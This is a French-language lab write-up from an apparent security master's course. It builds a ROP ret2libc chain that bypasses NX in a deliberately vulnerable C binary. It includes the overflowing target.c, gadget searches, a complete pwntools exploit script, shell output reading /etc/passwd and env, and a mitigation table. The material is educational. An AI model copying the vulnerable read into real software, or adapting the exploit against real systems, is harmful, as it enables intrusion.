# Write-up — Lab 05 : ROP Chains — ret2libc / NX Bypass

> **Pilier 3 — Embarqué / C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![ROP](https://img.shields.io/badge/technique-ROP%20ret2libc-red.svg)]()
[![NX Bypass](https://img.shields.io/badge/NX-Bypassed-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** NX activé — shellcode impossible  
**Technique :** Return Oriented Programming (ROP) — chaîne de gadgets libc  
**Chaîne :** `ret` (alignement) → `pop rdi; ret` → `/bin/sh` → `system()`  
**Résultat :** Shell interactif — lecture `/etc/passwd`, dump `env`, accès complet

---

## 2. Environnement

```text
OS      : WSL2 Ubuntu — Linux 6.6 (kernel Microsoft)
gcc     : -g -fno-stack-protector -no-pie
ASLR    : désactivé (echo 0 > /proc/sys/kernel/randomize_va_space)
```

**checksec :**

```
Stack:  No canary found
NX:     NX enabled          ← shellcode impossible
PIE:    No PIE (0x400000)   ← adresses binaire fixes
```

---

## 3. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
    system("/bin/sh");  // force system() dans le PLT et "/bin/sh" dans le binaire
}

void vulnerable() {
    char buffer[64];
    printf("Input : ");
    fflush(stdout);
    read(0, buffer, 200);   // overflow : 200 > 64
}

int main() {
    vulnerable();
    return 0;
}
```

`setup()` n'est jamais appelée par `main()`. Son rôle est de forcer le linker à inclure `system@plt` et la chaîne `/bin/sh` dans le binaire.

---

## 4. Pourquoi pas de shellcode ?

NX (No-eXecute) marque la stack comme **non-exécutable**. Si on injecte du shellcode dans le buffer et qu'on redirige RIP dessus, le CPU lève une exception — le shellcode ne s'exécute jamais.

**Solution : ROP** — au lieu d'injecter du code, on réutilise des fragments de code existants dans le binaire et la libc, appelés **gadgets**.

---

## 5. Gadgets — ROPgadget

```bash
ROPgadget --binary ./target | grep "pop rdi"
# → aucun résultat : le binaire est trop petit
```

Le binaire ne contient que 5 gadgets utiles. Il faut chercher dans la **libc** :

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
# → 0x10f78b : pop rdi ; ret  (offset dans libc)
```

Avec ASLR désactivé, libc charge toujours à `0x7ffff7c00000` → adresse absolue = `0x7ffff7d0f78b`.

---

## 6. Chaîne ROP construite

```
offset 0x00 : 0x000000000040101a   ret              ← alignement stack 16 octets
offset 0x08 : 0x00007ffff7d0f78b   pop rdi ; ret    ← gadget libc
offset 0x10 : 0x00007ffff7dcb42f   /bin/sh          ← argument de system()
offset 0x18 : 0x00007ffff7c58750   system()         ← appel final
```

**Convention x86-64 :** le premier argument d'une fonction passe par le registre `RDI`. Le gadget `pop rdi; ret` charge l'adresse de `/bin/sh` dans RDI avant de sauter à `system()`.

**Alignement :** `system()` exige une stack alignée sur 16 octets à l'entrée. Le `ret` initial consomme 8 octets et rétablit l'alignement.

---

## 7. Exploit — `exploit.py`

```python
from pwn import *

elf  = ELF('./target')
libc = elf.libc
context.binary = elf

# Demarrer le processus pour lire la base reelle de libc
p = process('./target')
libc.address = p.libs()[libc.path]
log.info(f"libc base : {hex(libc.address)}")

rop    = ROP([elf, libc])
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

# Chaine : ret + pop rdi + /bin/sh + system
ret_addr = rop.find_gadget(['ret'])[0]
rop.raw(ret_addr)
rop.call(system, [binsh])

OFFSET = 72
payload = b'A' * OFFSET + rop.chain()

p.recvuntil(b'Input : ')
p.send(payload)
p.interactive()
```

---

## 8. Résultat

```
[*] libc base  : 0x7ffff7c00000
[*] /bin/sh @ 0x7ffff7dcb42f
[*] system  @ 0x7ffff7c58750
[*] Chaine ROP :
    0x0000:         0x40101a ret
    0x0008:   0x7ffff7d0f78b pop rdi; ret
    0x0010:   0x7ffff7dcb42f [arg0] rdi = /bin/sh
    0x0018:   0x7ffff7c58750 system()
[+] Shell obtenu
$ id
uid=1000(angevirus) groups=1000(angevirus),4(adm),27(sudo),989(ollama),1001(docker)
$ cat /etc/passwd   → lecture fichiers système
$ env               → dump variables d'environnement
```

> Screenshot : [docs/lab05_rop_shell.png](docs/lab05_rop_shell.png)

---

## 9. Comparaison des Labs

| Lab | Technique | NX | Canary | PIE |
| --- | --- | --- | --- | --- |
| Lab 02 | ret2win (manuel) | Off | Off | Off |
| Lab 03 | ret2win (pwntools) | Off | Off | Off |
| Lab 04 | Format String write | On | Off | Off |
| **Lab 05** | **ROP ret2libc** | **On** | **Off** | **Off** |

Chaque lab active une protection supplémentaire — le prochain défi est **PIE + ASLR**.

---

## 10. Défense

| Vecteur | Mesure |
| --- | --- |
| Buffer overflow | Vérifier la taille des copies — `read(0, buf, sizeof(buf))` |
| ROP via libc | Activer **ASLR** (`/proc/sys/kernel/randomize_va_space = 2`) |
| Pas de canary | Compiler avec `-fstack-protector-strong` |
| Gadgets libc | **Full RELRO** + **PIE** rendent la résolution des adresses difficile |
| Chaîne ROP | **Shadow Stack (SHSTK / Intel CET)** valide les adresses de retour |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Stack buffer overflow — `read(0, buf, 200)` dans buf[64] |
| Offset RIP | 72 octets |
| Protection contournée | NX (stack non-exécutable) |
| Technique | ROP ret2libc — gadgets dans libc |
| Gadget clé | `pop rdi; ret` @ libc+0x10f78b |
| Cible | `system("/bin/sh")` |
| Résultat | Shell interactif — accès complet |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
